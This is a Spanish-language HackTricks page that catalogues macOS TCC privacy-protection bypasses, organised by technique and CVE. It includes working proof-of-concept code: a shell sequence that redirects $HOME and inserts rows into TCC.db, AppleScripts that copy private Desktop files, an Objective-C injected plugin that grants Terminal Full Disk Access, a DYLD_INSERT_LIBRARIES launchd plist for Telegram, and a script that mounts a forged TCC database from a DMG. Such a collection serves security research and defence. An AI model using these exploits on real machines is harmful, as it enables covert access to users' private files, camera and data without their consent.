# Bypasses de TCC

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidad

### Bypass de escritura

Esto no es un bypass, es simplemente cómo funciona TCC: **No protege contra la escritura**. Si Terminal **no tiene acceso para leer el Escritorio de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
El **extended attribute `com.apple.macl`** se añade al nuevo **file** para dar acceso a la **creators app** para leerlo.

### TCC ClickJacking

Es posible **poner una ventana sobre el aviso de TCC** para hacer que el usuario lo **acepte** sin darse cuenta. Puedes encontrar un PoC en [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

El atacante puede **crear apps con cualquier nombre** (por ejemplo, Finder, Google Chrome...) en el **`Info.plist`** y hacer que soliciten acceso a alguna ubicación protegida por TCC. El usuario pensará que la aplicación legítima es la que solicita este acceso.\
Además, es posible **eliminar la app legítima del Dock y colocar la falsa en su lugar**, de modo que, cuando el usuario haga clic en la falsa (que puede usar el mismo icono), esta podría llamar a la legítima, solicitar permisos de TCC y ejecutar un malware, haciendo creer al usuario que la app legítima solicitó el acceso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Más información y PoC en:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

De forma predeterminada, el acceso mediante **SSH solía tener "Full Disk Access"**. Para desactivarlo, es necesario que aparezca en la lista, pero deshabilitado (eliminarlo de la lista no eliminará esos privilegios):

![TCC Request by arbitrary name - SSH Bypass: De forma predeterminada, el acceso mediante SSH solía tener "Full Disk Access". Para desactivarlo, es necesario que aparezca en la lista, pero deshabilitado (eliminarlo...](<../../../../../images/image (1077).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido evadir esta protección**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Ten en cuenta que ahora, para poder habilitar SSH, necesitas **Full Disk Access**

### Handle extensions - CVE-2022-26767

El atributo **`com.apple.macl`** se asigna a los archivos para dar a una **determinada aplicación permisos para leerlos.** Este atributo se establece cuando se hace **drag\&drop** de un archivo sobre una app o cuando un usuario hace **doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.

Por lo tanto, un usuario podría **registrar una app maliciosa** para gestionar todas las extensiones y llamar a Launch Services para **abrir** cualquier archivo (por lo que el archivo malicioso obtendría permiso para leerlo).

### iCloud

El entitlement **`com.apple.private.icloud-account-access`** permite comunicarse con el servicio XPC **`com.apple.iCloudHelper`**, que **proporcionará tokens de iCloud**.

**iMovie** y **Garageband** tenían este entitlement y otros que lo permitían.

Para obtener más **información** sobre el exploit para **obtener tokens de iCloud** mediante ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Una app con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras Apps**. Esto significa que podría **abusar de los permisos concedidos a las otras Apps**.

Para obtener más información sobre Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por ejemplo, si una App tiene **permiso de Automation sobre `iTerm`**, en este ejemplo **`Terminal`** tiene acceso sobre iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y utilizarlo para realizar acciones:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### A través de Finder

O si una App tiene acceso a través de Finder, podría ejecutar un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Según el comportamiento de la App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El **tccd daemon** de **userland** utilizaba la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), y dado que el daemon de TCC se ejecuta mediante `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.\
Por tanto, un **attacker podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apuntara a un **directorio** **controlado**, reiniciar el daemon de **TCC** y, a continuación, **modificar directamente la base de datos de TCC** para otorgarse a sí mismo **todos los TCC entitlements disponibles** sin mostrar nunca un aviso al usuario final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes tenía acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se **crea en una ubicación no protegida**. Por lo tanto, se podía pedir a Notes que copiara un archivo protegido en una nota (es decir, en una ubicación no protegida) y después acceder al archivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

El binario `/usr/libexec/lsd`, junto con la library `libsecurity_translocate`, tenía el entitlement `com.apple.private.nullfs_allow`, que le permitía crear un montaje **nullfs**, y tenía el entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a todos los archivos.

Era posible añadir el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y, entonces, este mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`**, donde se podía **acceder** a todos los documentos dentro de Library.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** tiene una característica interesante: cuando se está ejecutando, **importará** los archivos depositados en **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** en la "media library" del usuario. Además, llama a algo como: **`rename(a, b);`**, donde `a` y `b` son:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Este comportamiento de **`rename(a, b);`** es vulnerable a una **Race Condition**, ya que es posible colocar dentro de la carpeta `Automatically Add to Music.localized` un archivo **TCC.db** falso y, cuando se crea la nueva carpeta (b), copiar el archivo, eliminarlo y apuntarlo a **`~/Library/Application Support/com.apple.TCC`**/.
**More info** [**in the writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="path/folder"`** está definido, básicamente significa que **cualquier db abierta se copia en esa ruta**. En este CVE, este control se utilizó para **escribir** dentro de una **SQLite database** que será **abierta por un proceso con FDA: la TCC database** y, después, abusar de **`SQLITE_SQLLOG_DIR`** con un **symlink en el nombre del archivo**, de modo que, cuando esa database se **abra**, el archivo **TCC.db del usuario se sobrescriba** con la database abierta.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Si se establece la variable de entorno **`SQLITE_AUTO_TRACE`**, la library **`libsqlite3.dylib`** comenzará a **registrar** todas las consultas SQL. Muchas aplicaciones utilizaban esta library, por lo que era posible registrar todas sus consultas SQLite.

Varias aplicaciones de Apple utilizaban esta library para acceder a información protegida por TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Esta **env variable es utilizada por el framework `Metal`**, que es una dependencia de varios programas, especialmente `Music`, que tiene FDA.

Al establecer lo siguiente: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Si `path` es un directorio válido, el bug se activará y podemos usar `fs_usage` para ver qué ocurre en el programa:

- se hará `open()` de un archivo llamado `path/.dat.nosyncXXXX.XXXXXX` (X es aleatorio)
- una o más operaciones `write()` escribirán el contenido en el archivo (no controlamos esto)
- `path/.dat.nosyncXXXX.XXXXXX` se renombrará mediante `rename()` a `path/name`

Es una escritura de un archivo temporal, seguida de un **`rename(old, new)`** **que no es seguro**.

No es seguro porque debe **resolver las rutas antiguas y nuevas por separado**, lo que puede tardar un tiempo y ser vulnerable a una Race Condition. Para obtener más información, puedes consultar la función `renameat_internal()` de `xnu`.

> [!CAUTION]
> Básicamente, si un proceso privilegiado está renombrando desde una carpeta que controlas, podrías ganar una RCE y hacer que acceda a un archivo diferente o, como en este CVE, abrir el archivo creado por la aplicación privilegiada y guardar un FD.
>
> Si el rename accede a una carpeta que controlas, mientras has modificado el archivo de origen o tienes un FD hacia él, cambias el archivo (o carpeta) de destino para que apunte a un symlink, de modo que puedas escribir cuando quieras.

Este fue el ataque utilizado en el CVE. Por ejemplo, para sobrescribir el `TCC.db` del usuario, podemos:

- crear `/Users/hacker/ourlink` apuntando a `/Users/hacker/Library/Application Support/com.apple.TCC/`
- crear el directorio `/Users/hacker/tmp/`
- establecer `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- activar el bug ejecutando `Music` con esta env variable
- capturar el `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X es aleatorio)
- aquí también hacemos `open()` de este archivo para escritura y conservamos el file descriptor
- intercambiar atómicamente `/Users/hacker/tmp` con `/Users/hacker/ourlink` **en un bucle**
- hacemos esto para maximizar nuestras posibilidades de tener éxito, ya que la race window es bastante reducida, pero perder la race tiene consecuencias insignificantes
- esperar un poco
- comprobar si hemos tenido suerte
- si no, volver a ejecutar desde el principio

Más información en [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Ahora, si intentas utilizar la env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, las apps no se iniciarán

### Apple Remote Desktop

Como root, podrías habilitar este servicio y el **agente ARD tendrá full disk access**, que posteriormente podría ser abusado por un usuario para hacer que copie una nueva **base de datos de usuario de TCC**.

## Por **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario, en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario consigue reiniciar TCC con una env variable `$HOME` apuntando a una **carpeta diferente**, podría crear una nueva base de datos de TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que conceda cualquier permiso de TCC a cualquier app.

> [!TIP]
> Ten en cuenta que Apple utiliza el valor almacenado en el perfil del usuario, dentro del atributo **`NFSHomeDirectory`**, como **valor de `$HOME`**. Por tanto, si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **weaponize** esta opción con un TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la carpeta **HOME** del usuario.

1. Obtener un blob _csreq_ para la app objetivo.
2. Colocar un archivo _TCC.db_ falso con el acceso requerido y el blob _csreq_.
3. Exportar la entrada de Directory Services del usuario con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificar la entrada de Directory Services para cambiar el directorio de inicio del usuario.
5. Importar la entrada modificada de Directory Services con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Detener el _tccd_ del usuario y reiniciar el proceso.

El segundo POC utilizaba **`/usr/libexec/configd`**, que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, con la que un atacante podía especificar un **Bundle personalizado para cargar**. Por tanto, el exploit **reemplaza** el método de cambio del directorio de inicio del usuario mediante **`dsexport`** y **`dsimport`** por una **inyección de código en `configd`**.

Para obtener más información, consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Mediante process injection

Existen diferentes técnicas para inyectar código dentro de un proceso y abusar de sus privilegios de TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Además, la process injection más común para bypass TCC se realiza mediante **plugins (load library)**.\
Los plugins son código adicional, normalmente en forma de libraries o plist, que será **cargado por la aplicación principal** y se ejecutará bajo su contexto. Por tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos concedidos o entitlements), el **custom code también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con la extensión **`.daplug`** y **no tenía habilitado el hardened** runtime.

Para weaponize este CVE, se **cambia** `NFSHomeDirectory` (abusando del entitlement anterior) para poder **tomar el control de la base de datos de TCC del usuario** y realizar un bypass de TCC.

Para obtener más información, consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

El binary **`/usr/sbin/coreaudiod`** tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permitía la inyección de código** y el segundo le daba acceso para **gestionar TCC**.

Este binary permitía cargar **plug-ins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por tanto, era posible **cargar un plugin y abusar de los permisos de TCC** con este POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para obtener más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Las aplicaciones del sistema que abren un stream de cámara mediante Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **estos plugins dentro del proceso**, ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no están restringidos por SIP).

Simplemente almacenar allí una library con el **constructor** común permitirá **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación Firefox tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para obtener más información sobre cómo explotarlo fácilmente, [**consulta el informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los entitlements **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código dentro del proceso y utilizar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de él para **obtener acceso a sus permisos**, como la grabación con la cámara. Puedes [**encontrar el payload en el writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Observa que, para utilizar la variable de entorno para cargar una library, se creó un **custom plist** para inyectar esta library y se utilizó **`launchctl`** para iniciarla:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Mediante invocaciones de open

Es posible invocar **`open`** incluso estando en un sandbox.

### Terminal Scripts

Es bastante común otorgar **Full Disk Access (FDA)** a Terminal, al menos en ordenadores utilizados por personas del ámbito tecnológico. También es posible invocar scripts **`.terminal`** mediante este comando.

Los scripts **`.terminal`** son archivos plist como este, con el comando que se ejecutará en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y ejecutarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Cualquier usuario** (incluso los que no tienen privilegios) puede crear y montar un snapshot de Time Machine y **acceder a TODOS los archivos** de ese snapshot.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga acceso de **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe ser concedido por un administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Aunque el archivo de la base de datos de TCC esté protegido, era posible **montar sobre el directorio** un nuevo archivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consulta el **exploit completo** en el [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Como se explica en el [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE abusaba de `diskarbitrationd`.

La función `DADiskMountWithArgumentsCommon` del framework público `DiskArbitration` realizaba las comprobaciones de seguridad. Sin embargo, es posible omitirlas llamando directamente a `diskarbitrationd` y, por tanto, utilizar elementos `../` en la ruta y symlinks.

Esto permitía a un atacante realizar montajes arbitrarios en cualquier ubicación, incluso sobre la base de datos de TCC, debido al entitlement `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar todo el disco y montarlo en otro lugar, omitiendo las protecciones de TCC.

### Servicios de localización

Existe una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** que indica qué clientes tienen permitido **acceder a los servicios de localización**.\
La carpeta **`/var/db/locationd/` no estaba protegida contra el montaje de DMG**, por lo que era posible montar nuestro propio plist.

## Mediante aplicaciones de inicio


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Mediante grep

En varias ocasiones, los archivos almacenan información sensible, como correos electrónicos, números de teléfono, mensajes... en ubicaciones no protegidas (lo que Apple considera una vulnerabilidad).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Esto ya no funciona, pero [**en el pasado sí funcionaba**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Otra forma utilizando [**eventos de CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referencias

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
